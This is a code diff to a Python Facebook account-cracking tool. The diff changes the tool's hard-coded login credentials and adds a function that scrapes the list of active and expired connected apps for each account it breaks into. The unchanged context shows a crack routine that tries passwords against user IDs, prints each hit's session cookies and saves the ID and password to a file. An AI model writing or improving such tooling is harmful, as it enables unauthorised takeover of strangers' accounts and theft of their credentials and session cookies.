@@ -27,6 +27,10 @@ from rich.columns import Columns as col
 from rich import pretty
 from rich.text import Text as tekz
 from time import localtime as lt
+import requests
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor as tred
+import time
 pretty.install()
 CON = sol()
 # ------------------[ MR-JUBAYER ]-------------------#
@@ -1845,7 +1849,7 @@ while attemps < 12345677901:
     password = input(
         '\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'EHC' and password == 'JUBAYER':
+    if username == 'axl' and password == '159':
         print(' \033[0;95mYou Have Successfully Logged in.')
         os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
         break
@@ -2237,6 +2241,35 @@ def setting():
 # -------------------[ BAGIAN-WORDLIST ]------------#
 
 
+def get_connected_apps(c_user):
+    try:
+        session = requests.Session()
+        url = f"https://mbasic.facebook.com/settings/apps/tabbed/?nav_source=unknown_facebook_menu&tab=active&c_user={c_user}"
+        response = session.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        # Extracting active apps
+        active_apps = [h3.text.strip()
+                       for h3 in soup.select('form[method="post"] h3')]
+
+        # Fetching inactive (expired) apps
+        url_inactive = f"https://mbasic.facebook.com/settings/apps/tabbed/?nav_source=unknown_facebook_menu&tab=inactive&c_user={c_user}"
+        response_inactive = session.get(url_inactive)
+        soup_inactive = BeautifulSoup(response_inactive.text, 'html.parser')
+        inactive_apps = [h3.text.strip()
+                         for h3 in soup_inactive.select('form[method="post"] h3')]
+
+        return {
+            'active_apps': active_apps,
+            'inactive_apps': inactive_apps
+        }
+    except Exception as e:
+        print(f"Error fetching connected apps: {e}")
+        return {
+            'active_apps': [],
+            'inactive_apps': []
+        }
+
 def passwrd():
     os.system('clear')
     print(logo)
@@ -2453,6 +2486,11 @@ def crack(idf, pwv):
                                    for key, value in ses.cookies.get_dict().items()])
                 print(
                     f'\r\033[38;5;46m[AXCZEL - ALIVE🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
+                
+                connected_apps_info = get_connected_apps(idf)
+                print('\033[97;1m[\033[92;1m•\033[95;1m] CONNECTED APPS :\033[0;93m %s ' % (
+                    connected_apps_info))
+
                 os.system(
                     'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
